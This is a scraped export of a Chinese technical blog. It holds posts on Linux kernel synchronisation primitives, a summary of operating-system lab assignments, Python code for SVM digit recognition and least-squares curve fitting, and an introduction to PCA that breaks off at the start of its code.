自旋锁保护的临界区通常是禁止内核抢占的，如果在单CPU环境下，自旋锁仅仅能够禁止或启用内核抢占，并不能起到锁的作用。当然，忙等时还是可以被抢占的，只有上锁后才会禁止抢占。 ps：阿里巴巴的面试官问过我一个问题，**自旋锁的本质是什么？**我当时猜测了一下，回答了原子操作，但没有能够进一步地进行解释。这里应该结合源码进行说明。可以看到对xadd就是一个标准的源子加操作。linux内核使用了两种实现。其一是“标签自旋锁”，raw_spin_lock最后会调用： static inline void __raw_spin_lock(raw_spinlock_t *lock) { preempt_disable(); //禁止了抢占 spin_acquire(&amp;lock-&gt;dep_map, 0, 0, _RET_IP_); LOCK_CONTENDED(lock, do_raw_spin_trylock, do_raw_spin_lock); } arch_spin_lock(arch_spinlock_t *lock) { register struct __raw_tickets inc = {.tail = TICKET_LOCK_INC};//这个值是0 inc = xadd(&amp;lock-&gt;tickets, inc); //xadd是原子加，在多CPU时会上锁 //获取标签，同时把序号＋1 if(likely(inc.head == inc.tail)) //标签到自己了，取锁成功了 goto out; for(;;){ //否则就不断循环，直到轮到自己 unsigned count = SPIN_THRESHOLD; do{ inc.head = READ_ONCE(lock-&gt;tickets.head); if(__tickets_equal(inc.head, inc.tail))//判断是否到自己的标签了 goto clear_slowpath; cpu_relax(); }while(--count); __ticket_lock_spinning(lock, inc.tail); } clear_slowpath: __ticket_check_and_clear_slowpath(lock, inc.head); cout: barrier(); } arch_spinlock_t的结构如下，实际上就是一个u16数 typedef struct arch_spinlock { union { __ticketpair_t head_tail; struct __raw_tickets { __ticket_t head, tail; } tickets; }; } arch_spinlock_t; 另一种是一种更加复杂的实现，被称为“排队自旋锁”。排队自旋锁基于每CPU变量实现，其实现比基于标签对实现更公平。 读－拷贝－更新 用来保护在多数情况下，被多个CPU读的数据结构，而设计的另一种同步技术，其特点是允许多个读和写并发执行，并且不使用锁。那么它如何在共享数据读前提下，实现同步呢？RCU只保护被动态分配，并且通过指针引用的数据结构，并且在RCU临界区内，禁止睡眠。RCU的做法是，在写操作时，拷贝一份原来的副本，在副本上进行修改，并且在修改完成后进行更新，将旧的指针更新为新的指针。 信号量 在linux中，有两种信号量，一种是给内核使用的内核信号量，另一种是给用户态进程使用的IPC信号量。这里我们只讨论内核信号量。其实信号量和自旋锁在“上锁”这一点上是类似的，如果锁关闭了，那么就不允许内核控制路径继续执行；只不过它不会像自旋锁一样，在原地“忙等”，而是将相应的进程挂起；只有资源可用了，进程才能继续运行。也正因为“睡眠”的特性，信号量不能用在中断处理程序和延迟处理函数上，只有允许睡眠的情况下，才能够使用信号量。 内核信号量的定义在semaphore.h当中： struct semaphore { raw_spinlock_t lock; //保护信号量的自旋锁 unsigned int count; struct list_head wait_list; }; 很神奇的，这里看到了raw_spinlock_t的影子。这其实是一个由Real-time linux引入的命名问题；这里我们只需要明白：尽可能使用spin_lock；绝对不允许被抢占和休眠的地方，使用raw_spin_lock，否则使用spin_lock，信号量的底层，使用了自旋锁来实现。 信号量的后两个域，count和wait_list分别是现有资源数和等待获取资源的进程序列。对于信号量，内核定义了这些API： void down(struct semaphore *sem); void up(struct semaphore *sem); int down_interruptible(struct semaphore *sem); int down_killable(struct semaphore *sem); int down_trylock(struct semaphore *sem); int down_timeout(struct semaphore *sem, long jiffies); 这里看看down函数： void down(struct semaphore *sem) { unsigned long flags; raw_spin_lock_irqsave(&amp;sem-&gt;lock, flags); if (likely(sem-&gt;count &gt; 0)) sem-&gt;count--; else __down(sem); raw_spin_unlock_irqrestore(&amp;sem-&gt;lock, flags); } 可以看到，这里自旋锁的作用实际上是保证count不被同时操作；而如果count大于0，则可以减少它的值，表示获取了这个锁，否则会__down_common，这个函数在不发生错误大情况下，会调用这样一段函数： raw_spin_unlock_irq(&amp;sem-&gt;lock); timeout = schedule_timeout(timeout); raw_spin_lock_irq(&amp;sem-&gt;lock); 这个函数是在timer.c代码中定义的。schedule_timeout函数将当前的任务置为休眠到设置的超时为止，这也就是信号量和自旋锁不同之处了，它允许进程的休眠。 而对于up函数来说，释放锁，增加count之后，会马上会检查是否有进程在等待资源： static noinline void __sched __up(struct semaphore *sem) { struct semaphore_waiter *waiter = list_first_entry(&amp;sem-&gt;wait_list, struct semaphore_waiter, list); list_del(&amp;waiter-&gt;list); waiter-&gt;up = true; wake_up_process(waiter-&gt;task); } 这样看来，其实信号量和自旋锁最大的不同就只有两个：自旋锁的忙等与信号量的休眠，资源的数量。 互斥量 虽然《深入理解linux内核》这本书中没有写，但是内核中也是有互斥量的；实际上它相当于count ＝ 1的信号量。互斥量的定义为： struct mutex { atomic_t count; spinlock_t wait_lock; struct list_head wait_list; #if defined(CONFIG_DEBUG_MUTEXES) || defined(CONFIG_MUTEX_SPIN_ON_OWNER) struct task_struct *owner; #endif #ifdef CONFIG_MUTEX_SPIN_ON_OWNER struct optimistic_spin_queue osq; #endif #ifdef CONFIG_DEBUG_MUTEXES void *magic; #endif #ifdef CONFIG_DEBUG_LOCK_ALLOC struct lockdep_map dep_map; #endif }; 可以看到它同样依赖于自旋锁实现，也包含一个进程的等待队列。我们来看看互斥量的上锁操作： void __sched mutex_lock(struct mutex *lock) { might_sleep(); __mutex_fastpath_lock(&amp;lock-&gt;count, __mutex_lock_slowpath); mutex_set_owner(lock); } 这里__mutex_fastpath_lock最终会调用一段汇编代码： asm_volatile_goto(LOCK_PREFIX &quot; decl %0\\n&quot; &quot; jns %l[exit]\\n&quot; : : &quot;m&quot; (v-&gt;counter) : &quot;memory&quot;, &quot;cc&quot; : exit); 也就是原子操作，修改mutex的counter，而mutex中的自旋锁，是为了保护wait_list而存在的，只是起到一个辅助作用，这点和信号量不太一样。 读写自旋锁/顺序锁/信号量 为了增加内核到并发能力，操作系统还设置了读写自旋锁。读写自旋锁允许多个内存控制路径，同时读同一个数据结构，但如果相对这个结构进行写操作，那么它必须首先获取读写自旋锁的写锁，写锁能让当前的路径独占访问这个资源。 顺序锁则是允许读者在读的同时进行写操作，因此写操作永远不会等待，但这样读操作有时候必须重复读多次，直到读到有效的副本为止。 读写信号量则和读写自旋锁类似，只不过它以挂起代替自旋。 禁止本地中断/可延迟函数 在前面提到的原语中，很多在实现的时候，都禁止了了本地的中断，这就保证了当前内核控制路径能够继续执行，例如raw_spin_lock_irqsave和raw_spin_lock_irqrestore。不过禁止本地中断不能阻止其他CPU 访问共享数据，因此通常和自旋锁结合使用。 而可延迟函数同样可以禁止和激活，这是由preempt_count字段中的值决定的。 本文链接： http://www.meng.uno/articles/e41a0c57/ 欢迎转载！","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://www.meng.uno/categories/操作系统/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.meng.uno/tags/Linux/"},{"name":"内核同步","slug":"内核同步","permalink":"http://www.meng.uno/tags/内核同步/"}]},{"title":"HIT操作系统实验总结","slug":"oslab","date":"2017-01-04T12:50:26.000Z","updated":"2018-03-01T13:29:43.092Z","comments":true,"path":"articles/86743755/","link":"","permalink":"http://www.meng.uno/articles/86743755/","excerpt":"哈工大《操作系统》六次实验每次需要修改的文件见：修改文件列表 本实验总结源自github项目： MIC 操作系统引导 bootsect.s * 实现屏幕输出 * 修改打印的字符串（空白也算作一个字符） * 读入setup.s代码（包括：设置驱动器、磁头，读取setup.s的磁道和扇区，并跳到相应位置开始执行） setup.s * （和bootsect.s中部分代码相同）打印相关信息 * （原代码已经可以部分打印硬件信息）需要在相关位置嵌入msg实现打印提示信息功能 build.c * 将bootsect.s、setup.s、system.s编译、链接生成Image文件 系统","text":"哈工大《操作系统》六次实验每次需要修改的文件见：修改文件列表 本实验总结源自github项目： MIC 操作系统引导 bootsect.s 实现屏幕输出 修改打印的字符串（空白也算作一个字符） 读入setup.s代码（包括：设置驱动器、磁头，读取setup.s的磁道和扇区，并跳到相应位置开始执行） setup.s （和bootsect.s中部分代码相同）打印相关信息 （原代码已经可以部分打印硬件信息）需要在相关位置嵌入msg实现打印提示信息功能 build.c 将bootsect.s、setup.s、system.s编译、链接生成Image文件 系统调用 unistd.h文件：添加系统调用功能号 sys.h声明新的系统调用处理函数；添加系统调用处理程序索引值到指针数组表中 system_call.s中增加系统调用总数 makefile添加新的系统调用所在文件的编译链接规则（依赖关系） 进程运行轨迹的跟踪与统计 process.c 涉及到fork()和wait()系统调用 主要实现了一个函数——cpuio_bound() 用fork()建立若干个同时运行的子程序 父P等待所有子P退出后才退出，每个子P性质通过cpuio_bound()控制性质 fork.c fork系统调用函数 main.c 内核的入口函数main()，对它的修改是增加日志创建语句，并将log文件关联到文件描述符log文件记录进程状态转换轨迹 kernel 主要寻找进程状态转换点： printk.c sched.c exit.c 信号量的实现和应用 sem_open 打开信号量 sem_wait 信号量P操作——value– sem_post 信号量V操作——value++ sem_unlink 释放信号量 地址映射与共享 shm.c shmget()：得到一个共享内存标识符或创建一个共享内存对象并返回共享内存标识符 shmat()：连接共享内存标识符为shmid的共享内存，连接成功后把共享内存区对象映射到调用进程的地址空间，随后可像本地空间一样访问 sem.c 实现信号量的四种操作，与实验四相同 字符显示的控制 keyboard.S 添加对字符F12的输入判断 console.c 添加输出到控制台的字符控制 file_dev.c 添加输出到文件的字符控制 本文链接： http://www.meng.uno/articles/86743755/ 欢迎转载！","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://www.meng.uno/categories/操作系统/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://www.meng.uno/tags/操作系统/"}]},{"title":"手写数字识别（SVM）","slug":"svm_number_recog","date":"2016-12-17T04:08:13.000Z","updated":"2018-02-17T02:12:08.406Z","comments":true,"path":"articles/7dac38a/","link":"","permalink":"http://www.meng.uno/articles/7dac38a/","excerpt":"调用第三方库 在此我选用的是sk-learn的关于svm的库，其关于此次实验的svm函数定义为： svm.SVC(C=8.0, kernel=‘rbf’, gamma=0.1) svm.SVC()函数的几个重要参数在其官方的介绍文档中有如下的解释： C :误差项的惩罚参数，浮点型，可选 (默认=1.0)； kernel : 指定核函数类型，字符型，可选 (默认=‘rbf’)，如果使用自定义的核函数，需要预先计算核矩阵； gamma : 浮点型, 可选 (默认=0.0)，’rbf’核函数的系数，需要注意的是，此处的gamma与课本中的sigma是互为倒数的关系（所以其可以为0）。 因为是调用别人","text":"调用第三方库 在此我选用的是sk-learn的关于svm的库，其关于此次实验的svm函数定义为： svm.SVC(C=8.0, kernel=‘rbf’, gamma=0.1) svm.SVC()函数的几个重要参数在其官方的介绍文档中有如下的解释： C :误差项的惩罚参数，浮点型，可选 (默认=1.0)； kernel : 指定核函数类型，字符型，可选 (默认=‘rbf’)，如果使用自定义的核函数，需要预先计算核矩阵； gamma : 浮点型, 可选 (默认=0.0)，’rbf’核函数的系数，需要注意的是，此处的gamma与课本中的sigma是互为倒数的关系（所以其可以为0）。 因为是调用别人的库（应该说完全是别人的功劳），所以在实现上没有什么可以说的。 代码 123456789101112131415161718192021222324252627282930313233 #!/usr/bin/env python3# -*- coding: utf-8 -*-\"\"\"Created on Thu Dec 1 13:30:21 2016@author: kuangmeng使用SVM分类器，从MNIST数据集中进行手写数字识别的分类程序\"\"\"import cPickleimport gzipfrom sklearn import svmimport timedef load_data(): \"\"\" 返回包含训练数据、验证数据、测试数据的元组的模式识别数据 \"\"\" f = gzip.open('data.gz', 'rb') training_data, validation_data, test_data = cPickle.load(f) f.close() return (training_data, validation_data, test_data)def Svm(): print (\"开始时间：\",time.strftime('%Y-%m-%d %H:%M:%S')) training_data, validation_data, test_data = load_data() # 传递训练模型的参数，这里用默认的参数 clf = svm.SVC(C=10.0, kernel='rbf', gamma=0.10,cache_size=8000,probability=False) # 进行模型训练 clf.fit(training_data[0], training_data[1]) # 测试集测试预测结果 predictions = [int(a) for a in clf.predict(test_data[0])] num_correct = sum(int(a == y) for a, y in zip(predictions, test_data[1])) print (\"%s 中的 %s 测试正确。\" % (num_correct, len(test_data[1]))) print (\"结束时间：\",time.strftime('%Y-%m-%d %H:%M:%S'))if __name__ == \"__main__\": Svm() 自己编程实现 在自己编程实现过程中，我也借鉴了很多其他人写的很成熟的方案，最终从数据结构、逻辑结构以及特征计算等方面得到比较合理的一组答案。 逻辑结构 本次实验的程序分为“训练”和“测试”两部分，两部分分别进行的工作如下： 训练 加载数据 初始化模型 更新标签 初始化预测误差 迭代每个样本（用KT优化） 得到每个样本的模型 对步骤5的解释： 对于svm我们要求解a（数组），如果 a的所有分量满足svm对偶问题的KKT条件，那么这个问题的解就求出来了，我们svm模型学习也就完成了。如果没有满足KKT，那么我们就在 a中找两个分量 ai和 aj，其中 ai 是违反KKT条件最严重的分量，通过计算，使得 ai 和 aj满足KKT条件，直到a的所有分量都满足KKT条件。而且这个计算过程是收敛的，因为每次计算出来的新的两个分量，使得对偶问题中要优化的目标函数值更小。因为每次求解的那两个分量，是要优化问题在这两个分量上的极小值，所以每一次优化，都会使目标函数比上一次的优化结果的值变小。 测试 加载数据 对每个数据预测 计算正确率与相关信息逻辑结构 特征计算 仿照KKT的优化方法，在本次试验中，我将每张图片作为一个数据。由此得到对每一个测试样本的预测（如果在某个分类的计算时结果为正，则说明该测试样本属于该类别，结果为0则不属于此类别）。 其他杂项 核函数选择：按照传统，选择的是RBF核函数，函数形式与教材完全相同； 数据来源：来源自网友整理之后的数据（测试数据与训练数据没有均分）； SMO优化算法： 取初始值a(0)=0，令K=0； 选取优化变量a1(k) , a2(k) , 针对优化问题，求得最优解 a1(k+1) , a2(k+1) 更新 a(k) 为 a(k+1) ； 在精度条件范围内是否满足停机条件，即是否有变量违反KKT条件，如果违反了，则令k=k+1，跳转2，否则4； 求得近似解â =a(k+1) 其中第3步中，是否违反KKT条件，对于a(k)的每个分量按照以下的违反KKT条件的公式进行验算即可。 变量选取分为两步，第一步是选取违反KKT条件最严重的ai，第二步是根据已经选取的第一个变量，选择优化程度最大的第二个变量。 违反KKT条件最严重的变量可以按照这样的规则选取，首先看0&lt;ai&lt;C的那些分量中，是否有违反KKT条件的，如果有，则选取yig(xi)最小的那个做为a1。如果没有则遍历所有的样本点，在违反KKT条件的分量中选取yig(xi)最小的做为a1。 当选择了a1后，如果a1对应的E1为正，选择Ei最小的那个分量最为a2，如果E1为负，选择Ei最大的那个分量最为a2，这是因为anew2依赖于|E1−E2|。 如果选择的a2，不能满足下降的最小步长，那么就遍历所有的支持向量点做为a2进行试用，如果仍然都不能满足下降的最小步长，那么就遍历所有的样本点做为a2试用。如果还算是不能满足下降的最小步长，那么就重新选择a1。 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237 #!/usr/bin/env python3# -*- coding: utf-8 -*-\"\"\"Created on Sun Dec 4 14:24:53 2016@author: kuangmeng\"\"\"import timeimport osimport mathclass model: def __init__(self): self.a = [] self.b = 0.0 class DATA: def __init__(self): self.samples = [] # 样本数据 self.tests = [] # 测试数据 self.models = [] # 训练的模型 self.forecasterror = [] # 预测知与真实y之差Ei self.modelnum = 0 # 当前正使用或训练的模型 self.cache= [] # 缓存kernel函数的计算结果 self.sigma = 10 # sigma def init_models(self): for i in range(0, 10): m = model() for j in range(len(self.samples)): m.a.append(0) self.models.append(m) def init_cache(self): i = 0 for x in self.samples: print (\"正在计算第\",i+1,\"个样本的RBF核\") self.cache.append([]) j = 0 for z in self.samples: if i &gt; j: self.cache[i].append(self.cache[j][i]) else: self.cache[i].append(RBF(x,z)) j += 1 i += 1 class image: def __init__(self): self.data = [] self.num = 0 self.label = [] self.filename = \"\"gv = DATA()# RBF核函数def RBF(j, i): if j == i: return math.exp(0) sigma = gv.sigma ret = 0.0 for m in range(len(j.data)): for n in range(len(j.data[m])): ret += math.pow(int(j.data[m][n]) - int(i.data[m][n]), 2) ret = math.exp(-ret/sigma) return ret#加载测试与训练数据def loaddata(dirpath, name): files = os.listdir(dirpath) for file in files: img = image() img.data = images(dirpath + file) img.num = int(file[0]) img.filename = file name.append(img)#图片分列 def images(path): img = [] file = open(path, \"r\") for line in file: line = line[:-2] img.append(line) return img #更新样本标签，正在训练啥就将啥的标签定为1，其他的定为-1 def update_samples_label(num): for img in gv.samples: if img.num == num: img.label.append(1) else: img.label.append(-1) #初始化DATA.forecasterrordef init_forecasterror(): gv.forecasterror = [] for i in range(len(gv.samples)): diff = 0.0 for j in range(len(gv.samples)): if gv.models[gv.modelnum].a[j] != 0: diff += gv.models[gv.modelnum].a[j] * gv.samples[j].label[gv.modelnum] * gv.cache[j][i] diff += gv.models[gv.modelnum].b diff -= gv.samples[i].label[gv.modelnum] gv.forecasterror.append(diff)#更新DATA.forecasterror def update_forecasterror(i, new_ai, j, new_bj, new_b): for idx in range(len(gv.samples)): diff = (new_ai - gv.models[gv.modelnum].a[i])* gv.samples[i].label[gv.modelnum] * gv.cache[i][idx] diff += (new_bj - gv.models[gv.modelnum].a[j])* gv.samples[j].label[gv.modelnum] * gv.cache[j][idx] diff += new_b - gv.models[gv.modelnum].b diff += gv.forecasterror[idx] gv.forecasterror[idx] = diff# g(x)def predict(m): pred = 0.0 for j in range(len(gv.samples)): if gv.models[gv.modelnum].a[j] != 0: pred += gv.models[gv.modelnum].a[j] * gv.samples[j].label[gv.modelnum] * RBF(gv.samples[j],m) pred += gv.models[gv.modelnum].b return preddef save_models(): for i in range(10): fn = open(\"models/\" + str(i) + \"_a.model\", \"w\") for ai in gv.models[i].a: fn.write(str(ai)) fn.write('\\n') fn.close() fn = open(\"models/\" + str(i) + \"_b.model\", \"w\") fn.write(str(gv.models[i].b)) fn.close()def load_models(): for i in range(10): fn = open(\"models/\" + str(i) + \"_a.model\", \"r\") j = 0 for line in fn: gv.models[i].a[j] = float(line) j += 1 fn.close() fn = open(\"models/\" + str(i) + \"_b.model\", \"r\") gv.models[i].b = float(fn.readline()) fn.close()#### T: tolerance 误差容忍度(精度)# times: 迭代次数# 优化方法：SMO# C: 惩罚系数# modelnum: 模型序号0到9# step: aj移动的最小步长###def train(T, times, C, modelnum, step): time = 0 gv.modelnum = modelnum update_samples_label(modelnum) init_forecasterror() updated = True while time &lt; times and updated: updated = False time += 1 for i in range(len(gv.samples)): ai = gv.models[gv.modelnum].a[i] Ei = gv.forecasterror[i] #计算违背KKT的点 if (gv.samples[i].label[gv.modelnum] * Ei &lt; -T and ai &lt; C) or (gv.samples[i].label[gv.modelnum] * Ei &gt; T and ai &gt; 0): for j in range(len(gv.samples)): if j == i: continue kii = gv.cache[i][i] kjj = gv.cache[j][j] kji = kij = gv.cache[i][j] eta = kii + kjj - 2 * kij if eta &lt;= 0: continue new_aj = gv.models[gv.modelnum].a[j] + gv.samples[j].label[gv.modelnum] * (gv.forecasterror[i] - gv.forecasterror[j]) / eta # f 7.106 L = 0.0 H = 0.0 a1_old = gv.models[gv.modelnum].a[i] a2_old = gv.models[gv.modelnum].a[j] if gv.samples[i].label[gv.modelnum] == gv.samples[j].label[gv.modelnum]: L = max(0, a2_old + a1_old - C) H = min(C, a2_old + a1_old) else: L = max(0, a2_old - a1_old) H = min(C, C + a2_old - a1_old) if new_aj &gt; H: new_aj = H if new_aj &lt; L: new_aj = L if abs(a2_old - new_aj) &lt; step: # print (\"j = %d, is not moving enough\" % j) continue new_ai = a1_old + gv.samples[i].label[gv.modelnum] * gv.samples[j].label[gv.modelnum] * (a2_old - new_aj) # f 7.109 new_b1 = gv.models[gv.modelnum].b - gv.forecasterror[i] - gv.samples[i].label[gv.modelnum] * kii * (new_ai - a1_old) - gv.samples[j].label[gv.modelnum] * kji * (new_aj - a2_old) # f7.115 new_b2 = gv.models[gv.modelnum].b - gv.forecasterror[j] - gv.samples[i].label[gv.modelnum]*kji*(new_ai - a1_old) - gv.samples[j].label[gv.modelnum]*kjj*(new_aj-a2_old) # f7.116 if new_ai &gt; 0 and new_ai &lt; C: new_b = new_b1 elif new_aj &gt; 0 and new_aj &lt; C: new_b = new_b2 else: new_b = (new_b1 + new_b2) / 2.0 update_forecasterror(i, new_ai, j, new_aj, new_b) gv.models[gv.modelnum].a[i] = new_ai gv.models[gv.modelnum].a[j] = new_aj gv.models[gv.modelnum].b = new_b updated = True print (\"迭代次数: %d, 修改组合: i: %d 与 j:%d\" %(time, i, j)) break# 测试数据def test(): record = 0 record_correct = 0 for img in gv.tests: print (\"正在测试：\", img.filename) for modelnum in range(10): gv.modelnum = modelnum if predict(img) &gt; 0: print (\"测试结果：\",modelnum) record += 1 if modelnum == int(img.filename[0]): record_correct += 1 break print (\"相关记录数量:\", record) print (\"正确识别数量:\", record_correct) print (\"正确识别比例:\", record_correct/record) print (\"测试数据总量:\", len(gv.tests))if __name__ == \"__main__\": print (\"开始时间：\",time.strftime('%Y-%m-%d %H:%M:%S')) training = True loaddata(\"train/\", gv.samples) loaddata(\"test/\", gv.tests) print (\"训练数据个数：\",len(gv.samples)) print (\"测试数据个数：\",len(gv.tests)) if training == True: gv.init_cache() gv.init_models() print (\"模型初始化成功！\") print (\"当前时间：\",time.strftime('%Y-%m-%d %H:%M:%S')) T = 0.0001 C = 10 step = 0.001 gv.sigma = 1 if training == True: for i in range(10): print (\"正在训练模型:\", i) train(T, 10, C, i, step) save_models() else: load_models() for i in range(10): update_samples_label(i) print (\"训练完成时间：\",time.strftime('%Y-%m-%d %H:%M:%S')) test() print (\"测试完成时间：\",time.strftime('%Y-%m-%d %H:%M:%S')) 本文链接： http://www.meng.uno/articles/7dac38a/ 欢迎转载！","categories":[{"name":"AI","slug":"AI","permalink":"http://www.meng.uno/categories/AI/"},{"name":"模式识别","slug":"AI/模式识别","permalink":"http://www.meng.uno/categories/AI/模式识别/"}],"tags":[{"name":"模式识别","slug":"模式识别","permalink":"http://www.meng.uno/tags/模式识别/"}]},{"title":"多项式拟合曲线——最小二乘法","slug":"least_square_method","date":"2016-12-17T03:59:39.000Z","updated":"2018-02-17T02:10:59.079Z","comments":true,"path":"articles/1af17fd9/","link":"","permalink":"http://www.meng.uno/articles/1af17fd9/","excerpt":"直接上代码，最小二乘法比较简单，在拟合效果上也相当不错： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 # -*- coding: utf-8 -*- import matplotlib.pyplot as plt import numpy import random f","text":"直接上代码，最小二乘法比较简单，在拟合效果上也相当不错： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364 # -*- coding: utf-8 -*-import matplotlib.pyplot as pltimport numpyimport randomf = plt.figure()draw = f.add_subplot(111)#拟合函数的次数限制times=9tail=times+1x = numpy.arange(-2,2,0.1)y = [((xi-1)*(xi*xi-1)+0.5)*numpy.cos(xi) for xi in x]#所有使用到的全局变量声明i=0xlabel=[]ylabel=[]A=[]B=[]tempA=[]tempB=[]X=[]Y=[]#-----------------------------#生成数据，加入cos函数，作为噪声！for xi in x: r=float(random.randint(80,100))/100 xlabel.append(xi*r) ylabel.append(y[i]*r) i+=1draw.plot(xlabel,ylabel,color='b',linestyle='',marker='*')length=len(xlabel)for i in range(0,tail): tempA=[] for j in range(0,tail): temp=0.0 for k in range(0,length): d=1.0 for m in range(0,j+i): d=d*xlabel[k] temp+=d tempA.append(temp) A.append(tempA)for i in range(0,tail): temp=0.0 for k in range(0,length): d=1.0 for j in range(0,i): d=d*xlabel[k] temp+=ylabel[k]*d B.append(temp) #X为可行解X=numpy.linalg.solve(A,B)print('可行解a(x的系数)的矩阵表示为：[a0,---,a%d]'%(times))print(X)for i in range(0,length): temp=0.0 for j in range(0,tail): d=1.0 for k in range(0,j): d*=x[i] d*=X[j] temp+=d Y.append(temp)draw.plot(x,Y,color='r',linestyle='-',marker='.') 本文链接： http://www.meng.uno/articles/1af17fd9/ 欢迎转载！","categories":[{"name":"AI","slug":"AI","permalink":"http://www.meng.uno/categories/AI/"},{"name":"机器学习","slug":"AI/机器学习","permalink":"http://www.meng.uno/categories/AI/机器学习/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://www.meng.uno/tags/机器学习/"}]},{"title":"主成分分析（PCA）","slug":"pca","date":"2016-12-17T03:52:21.000Z","updated":"2018-02-17T02:11:23.106Z","comments":true,"path":"articles/6c0d033f/","link":"","permalink":"http://www.meng.uno/articles/6c0d033f/","excerpt":"实验要求 实验目标 实现一个PCA模型，能够对给定数据进行降维（即找到其中的主成分） 实验过程 首先人工生成一些数据（如三维数据），让它们主要分布在低维空间中，如首先让某个维度的方差远小于其它维度，然后对这些数据旋转。生成这些数据后，用你的PCA方法进行主成分提取。 找一个人脸数据（小点样本量），用你实现PCA方法对该数据降维，找出一些主成分，然后用这些主成分对每一副人脸图像进行重建，比较一些它们与原图像有多大差别（用信噪比衡量）。 实验准备 降维的必要 多重共线性–预测变量之间相互关联。多重共线性会导致解空间的不稳定，从而可能导致结果的不连贯。 高维空间本身具有稀疏性。一维正态分布有","text":"实验要求 实验目标 实现一个PCA模型，能够对给定数据进行降维（即找到其中的主成分） 实验过程 首先人工生成一些数据（如三维数据），让它们主要分布在低维空间中，如首先让某个维度的方差远小于其它维度，然后对这些数据旋转。生成这些数据后，用你的PCA方法进行主成分提取。 找一个人脸数据（小点样本量），用你实现PCA方法对该数据降维，找出一些主成分，然后用这些主成分对每一副人脸图像进行重建，比较一些它们与原图像有多大差别（用信噪比衡量）。 实验准备 降维的必要 多重共线性–预测变量之间相互关联。多重共线性会导致解空间的不稳定，从而可能导致结果的不连贯。 高维空间本身具有稀疏性。一维正态分布有68%的值落于正负标准差之间，而在十维空间上只有0.02%。 过多的变量会妨碍查找规律的建立。 仅在变量层面上分析可能会忽略变量之间的潜在联系。例如几个预测变量可能落入仅反映数据某一方面特征的一个组内。 降维的目的 减少预测变量的个数 确保这些变量是相互独立的 提供一个框架来解释结果 降维的方法 主成分分析 因子分析 用户自定义复合 有关PCA PCA概念 主成分分析 （ Principal Component Analysis ， PCA ）或者主元分析。是一种掌握事物主要矛盾的统计分析方法，它可以从多元事物中解析出主要影响因素，揭示事物的本质，简化复杂的问题。计算主成分的目的是将高维数据投影到较低维空间。给定 n 个变量的 m 个观察值，形成一个 n * m 的数据矩阵， n 通常比较大。对于一个由多个变量描述的复杂事物，人们难以认识，那么是否可以抓住事物主要方面进行重点分析呢？如果事物的主要方面刚好体现在几个主要变量上，我们只需要将这几个变量分离出来，进行详细分析。但是，在一般情况下，并不能直接找出这样的关键变量。这时我们可以用原有变量的线性组合来表示事物的主要方面， PCA 就是这样一种分析方法。 PCA作用范围 PCA 主要用于数据降维，对于一系列例子的特征组成的多维向量，多维向量里的某些元素本身没有区分性，比如某个元素在所有的例子中都为1，或者与1差距不大，那么这个元素本身就没有区分性，用它做特征来区分，贡献会非常小。所以我们的目的是找那些变化大的元素，即方差大的那些维，而去除掉那些变化不大的维，从而使特征留下的都是“精品”，而且计算量也变小了。 对于一个K维的特征来说，相当于它的每一维特征与其他维都是正交的（相当于在多维坐标系中，坐标轴都是垂直的），那么我们可以变化这些维的坐标系，从而使这个特征在某些维上方差大，而在某些维上方差很小。 PCA的算法步骤 设有m条n维数据。 将原始数据按列组成n行m列矩阵X 将X的每一行（代表一个属性字段）进行零均值化，即减去这一行的均值 求出协方差矩阵C=1/mXX’ 求出协方差矩阵的特征值及对应的特征向量 将特征向量按对应特征值大小从上到下按行排列成矩阵，取前k行组成矩阵P Y=PX即为降维到k维后的数据 实验环境 Spyder 作为Python开发的集成开发环境； 编程语言：Python 3.5 操作系统：macOS Sierra 小结 PCA的应用分析 对于一个训练集，100个对象模板，特征是10维，那么它可以建立一个100*10的矩阵，作为样本。求这个样本的协方差矩阵，得到一个10*10的协方差矩阵，然后求出这个协方差矩阵的特征值和特征向量，应该有10个特征值和特征向量，我们根据特征值的大小，取前四个特征值所对应的特征向量，构成一个10*4的矩阵，这个矩阵就是我们要求的特征矩阵，100*10的样本矩阵乘以这个10*4的特征矩阵，就得到了一个100*4的新的降维之后的样本矩阵，每个特征的维数下降了。当给定一个测试的特征集之后，比如1*10维的特征，乘以上面得到的10*4的特征矩阵，便可以得到一个1*4的特征，用这个特征去分类。所以做PCA实际上是求得这个投影矩阵，用高维的特征乘以这个投影矩阵，便可以将高维特征的维数下降到指定的维数。 在进行基因表达数据分析时，一个重要问题是确定每个实验数据是否是独立的，如果每次实验数据之间不是独立的，则会影响基因表达数据分析结果的准确性。对于利用基因芯片所检测到的基因表达数据，如果用 PCA 方法进行分析，可以将各个基因作为变量，也可以将实验条件作为变量。当将基因作为变量时，通过分析确定一组“主要基因元素”，它们能够很好地说明基因的特征，解释实验现象；当将实验条件作为变量时，通过分析确定一组“主要实验因素”，它们能够很好地刻画实验条件的特征，解释基因的行为。 PCA作为基础的数学分析方法，其实际应用十分广泛，比如人口统计学、数量地理学、分子动力学模拟、数学建模、数理分析等学科中均有应用，是一种常用的多变量分析方法。 PCA优缺点 优点： 以方差衡量信息的无监督学习，不受样本标签限制； 各主成分之间正交，可消除原始数据成分间的相互影响； 可减少指标选择的工作量； 用少数指标代替多数指标，利用PCA降维是最常用的算法； 计算方法简单，易于实现。 缺点： 主成分解释其含义往往具有一定的模糊性，不如原始样本完整； 贡献率小的主成分往往可能含有对样本差异的重要信息； 特征值矩阵的正交向量空间是否唯一有待讨论； 属于无监督学习。 代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465 #!/usr/bin/env python3# -*- coding: utf-8 -*-\"\"\"Created on Tue Nov 29 